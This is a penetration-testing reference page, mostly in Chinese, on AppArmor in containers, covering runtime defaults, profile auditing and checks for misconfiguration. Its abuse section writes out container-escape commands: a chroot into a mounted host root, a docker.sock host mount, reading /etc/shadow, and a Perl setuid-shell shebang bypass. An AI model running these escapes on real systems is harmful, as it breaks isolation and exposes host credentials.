# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

AppArmor 是一种通过每个程序配置文件施加限制的 **强制访问控制** 系统。与严重依赖用户和组所有权的传统 DAC 检查不同，AppArmor 允许内核强制执行附加到进程本身的策略。在容器环境中，这一点很重要，因为一个工作负载可能拥有足够的传统权限去尝试某个操作，但仍会被拒绝，原因是其 AppArmor 配置文件不允许相关的路径、mount、网络行为或 capability 的使用。

最重要的概念性观点是 AppArmor 是 **基于路径的**。它通过路径规则来处理文件系统访问，而不是像 SELinux 那样通过标签进行处理。这使得它既易于理解又强大，但也意味着 bind mounts 和替代路径布局需要特别注意。如果相同的主机内容可以通过不同路径被访问到，策略的效果可能并非操作员最初预期。

## 在容器隔离中的作用

容器安全审查常常止于 capabilities 和 seccomp，但在这些检查之后 AppArmor 仍然很重要。想象一个容器拥有比它应有的更多权限，或者一个工作负载因为运行需要而额外要求一个 capability。AppArmor 仍然可以以限制文件访问、mount 行为、网络和执行模式的方式阻止明显的滥用路径。这就是为什么为了“让应用能工作”而禁用 AppArmor，可能会悄然将一个仅有风险的配置转变为可被主动利用的配置。

## Lab

要检查 AppArmor 在主机上是否处于活动状态，请使用：
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
要查看当前容器进程以什么身份运行：
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
这个差异很有启发性。在正常情况下，进程应该显示与运行时选择的配置文件相关联的 AppArmor 上下文。在未受限（unconfined）情况下，这一额外的限制层会消失。

你也可以检查 Docker 认为它应用了什么：
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## 运行时用法

当宿主机支持时，Docker 可以在运行时应用默认或自定义的 AppArmor 配置文件。Podman 在基于 AppArmor 的系统上也可以与 AppArmor 集成，尽管在以 SELinux 为主的发行版上，另一个 MAC 系统通常更占主导地位。Kubernetes 可以在实际支持 AppArmor 的节点上将 AppArmor 策略暴露到工作负载级别。LXC 及相关的 Ubuntu-family system-container 环境也广泛使用 AppArmor。

关键在于，AppArmor 不是一个“Docker feature”。它是一个宿主机内核功能，多个 runtime 可以选择应用它。如果宿主机不支持它，或者 runtime 被告知以 unconfined 模式运行，所谓的保护实际上就不存在。

针对 Kubernetes，现代 API 为 `securityContext.appArmorProfile`。自 Kubernetes `v1.30` 起，旧的 beta AppArmor 注解已被废弃。在受支持的主机上，`RuntimeDefault` 是默认配置文件，而 `Localhost` 指向必须已在节点上加载的配置文件。这在审查时很重要，因为一个 manifest 可能看起来对 AppArmor 有感知，但仍然完全依赖于节点端的支持和预加载的配置文件。

一个微妙但有用的运维细节是，显式设置 `appArmorProfile.type: RuntimeDefault` 比简单省略该字段更严格。如果该字段被显式设置且节点不支持 AppArmor，则准入应失败。如果省略该字段，工作负载仍可能在不支持 AppArmor 的节点上运行，只是不会获得那一额外的约束层。从攻击者的角度来看，这也是检查 manifest 与实际节点状态两者的好理由。

在支持 Docker 的 AppArmor 主机上，最著名的默认配置是 `docker-default`。该配置文件由 Moby 的 AppArmor 模板生成，之所以重要，是因为它解释了为什么一些 capability-based PoCs 在默认容器中仍然失败。大体上，`docker-default` 允许普通的网络操作，拒绝对大部分 `/proc` 的写入，拒绝访问 `/sys` 的敏感部分，阻止挂载操作，并限制 ptrace，使其不成为通用的主机探测原语。理解这一基线有助于区分“容器拥有 `CAP_SYS_ADMIN`”与“容器能否实际在我关心的内核接口上利用该 capability”。

## 配置文件管理

AppArmor 配置文件通常存放在 `/etc/apparmor.d/` 下。一个常见的命名约定是将可执行文件路径中的斜杠替换为点。例如，`/usr/bin/man` 的配置文件通常存放为 `/etc/apparmor.d/usr.bin.man`。这一细节在防御和评估时都很重要，因为一旦你知道了活动的配置文件名，通常可以快速在宿主机上定位到对应文件。

Useful host-side management commands include:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
这些命令在 container-security 参考中之所以重要，是因为它们解释了 profiles 实际如何被构建、加载、切换到 complain mode，以及在应用更改后如何被修改。如果运维人员在故障排查时习惯将 profiles 切换到 complain mode 却忘记恢复 enforcement，那么容器在文档中可能看起来受到了保护，但在实际运行中行为会宽松得多。

### 构建和更新 profiles

`aa-genprof` 可以观察应用行为并交互式地帮助生成一个 profile：
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` 可以生成一个模板 profile，之后可以使用 `apparmor_parser` 加载：
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
当二进制文件发生更改且需要更新策略时，`aa-logprof` 可以重放日志中发现的拒绝记录，并帮助操作员决定是否允许或拒绝它们：
```bash
sudo aa-logprof
```
### 日志

AppArmor 的拒绝通常可以通过 `auditd`、syslog 或诸如 `aa-notify` 的工具看到：
```bash
sudo aa-notify -s 1 -v
```
这在运维和进攻上都很有用。防御方用它来精细化配置文件。攻击者用它来判断被拒绝的确切路径或操作，以及是否是 AppArmor 在阻断利用链。

### 确认确切的配置文件

当运行时为某个容器显示特定的 AppArmor 配置文件名时，通常需要将该名称映射回磁盘上的配置文件：
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
这在主机端审查时特别有用，因为它弥合了“容器声称在配置文件 `lowpriv` 下运行”与“实际规则存放在这个可以审核或重新加载的特定文件中”之间的差距。

### 高信号（High-Signal）应审计的规则

当你能够读取配置文件时，不要仅停留在简单的 `deny` 行。若干规则类型会实质性地改变 AppArmor 在防止容器逃逸尝试时的效用：

- `ux` / `Ux`: 允许以 unconfined 方式执行目标二进制。如果在 `ux` 下允许访问可达的 helper、shell 或 interpreter，通常这是首先要测试的点。
- `px` / `Px` 和 `cx` / `Cx`: 在 exec 时执行配置文件切换。它们不一定就是坏的，但值得审计，因为切换可能落入比当前更宽泛的配置文件。
- `change_profile`: 允许任务切换到另一个已加载的配置文件，立即生效或在下一次 exec 时生效。如果目标配置文件更弱，这可能成为从限制性域中逃逸的预期出口。
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: 这些会影响你对配置文件的信任程度。`complain` 将拒绝记录而不是强制执行，`unconfined` 移除边界，而 `prompt` 取决于 userspace 的决策路径，而不是纯内核强制的 deny。
- `userns` or `userns create,`: 新版 AppArmor 策略可以调节 user namespaces 的创建。如果容器配置文件明确允许，嵌套的 user namespaces 仍然可用，即使平台将 AppArmor 作为加固策略的一部分。

有用的主机端 grep：
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
这种审计通常比盯着数百条普通的文件规则更有用。如果逃逸依赖于执行一个辅助程序、进入新的命名空间，或转到更宽松的配置文件，答案往往隐藏在这些面向过渡的规则中，而不是显而易见的 `deny /etc/shadow r` 那类行。

## 错误配置

最明显的错误是 `apparmor=unconfined`。管理员经常在调试一个由于配置文件正确阻止了某些危险或意外行为而失败的应用时设置它。如果该标志保留在生产环境中，整个 MAC 层实际上就被移除了。

另一个微妙的问题是认为 bind 挂载无害，因为文件权限看起来正常。由于 AppArmor 基于路径，当在其他挂载位置暴露主机路径时，可能会与路径规则产生不良交互。第三个错误是忘记，如果主机内核并未真正强制执行 AppArmor，配置文件中的名称几乎没有任何意义。

## 滥用

当 AppArmor 不存在时，之前受限的操作可能突然可行：通过 bind 挂载读取敏感路径，访问本应更难使用的 procfs 或 sysfs 的部分内容，如果 capabilities/seccomp 也允许，则执行与挂载相关的操作，或使用配置文件通常会拒绝的路径。AppArmor 常常是解释为什么基于 capability 的逃逸尝试在理论上“应该可行”但实际失败的机制。移除 AppArmor，类似的尝试可能就会开始成功。

如果你怀疑 AppArmor 是阻止路径遍历、bind-mount 或基于挂载的滥用链的主要因素，第一步通常是比较有无配置文件时哪些内容变得可访问。例如，如果一个主机路径被挂载到容器内，首先检查你是否可以遍历并读取它：
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
如果容器还具有危险的 capability（例如 `CAP_SYS_ADMIN`），最实用的测试之一是判断 AppArmor 是否在阻止挂载操作或访问敏感的内核文件系统：
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
在通过 bind mount 已经提供了 host path 的环境中，失去 AppArmor 也可能把一个只读的信息披露问题变成对主机文件的直接访问：
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
这些命令的要点不是说仅仅因为 AppArmor 就能造成 breakout。关键是，一旦 AppArmor 被移除，许多基于 filesystem 和 mount 的 abuse paths 就可以立即进行测试。

### 完整示例：AppArmor Disabled + Host Root Mounted

如果 container 已经把 host root bind-mounted 到 `/host`，移除 AppArmor 可以把一个被阻止的 filesystem abuse path 变成完整的 host escape：
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
一旦 shell 通过宿主文件系统执行，工作负载实际上已逃出容器边界：
```bash
id
hostname
cat /etc/shadow | head
```
### 完整示例：AppArmor 已禁用 + Runtime Socket

如果真正的屏障是 AppArmor 对 runtime state 的保护，那么一个挂载的 socket 就足以完成一次完整的 escape：
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
确切的路径取决于挂载点，但最终结果相同：AppArmor 不再阻止对 runtime API 的访问，runtime API 可以启动一个可危及主机的容器。

### 完整示例: Path-Based Bind-Mount Bypass

因为 AppArmor 是基于路径的，所以保护 `/proc/**` 并不会自动保护通过不同路径可访问的相同主机 procfs 内容：
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影响取决于实际挂载了什么以及替代路径是否也绕过了其他控制，但这种模式是最清楚的理由之一，说明必须将 AppArmor 与 mount layout 一起评估，而不是孤立地评估。

### 完整示例: Shebang Bypass

AppArmor 策略有时以一种方式针对解释器路径，但未充分考虑通过 shebang 处理执行脚本的情况。一个历史示例是使用一个脚本，其第一行指向受限的解释器：
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
这样的示例很重要，提醒我们 profile 的意图与实际执行语义可能会出现偏差。在审查 container 环境中的 AppArmor 时，应特别关注 interpreter chains 和替代执行路径。

## Checks

这些检查的目标是快速回答三个问题：AppArmor 是否在主机上启用？当前进程是否受限？runtime 是否实际将 profile 应用到该 container？
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
这里有几点值得注意：

- 如果 `/proc/self/attr/current` 显示 `unconfined`，该工作负载没有受益于 AppArmor 的隔离。
- 如果 `aa-status` 显示 AppArmor 已禁用或未加载，运行时配置中的任何配置文件名大多只是装饰性的。
- 如果 `docker inspect` 显示 `unconfined` 或意外的自定义配置文件，那通常就是文件系统或基于挂载的滥用路径可行的原因。
- 如果 `/sys/kernel/security/apparmor/profiles` 不包含你期望的配置文件，单靠运行时或编排器的配置本身不足以产生隔离。
- 如果一个被认为已强化的配置文件包含 `ux`、广泛的 `change_profile`、`userns`，或 `flags=(complain)` 样式的规则，实际的边界可能比配置文件名称暗示的要弱得多。

如果容器出于运营原因已经具有提升的权限，保持 AppArmor 启用通常会决定这是一次受控的特例还是一次更广泛的安全失败。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

对于 AppArmor，最重要的变量往往是 **host**，而不仅仅是运行时。在未启用 AppArmor 的节点上，manifest 中的配置文件设置不会创建隔离。

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
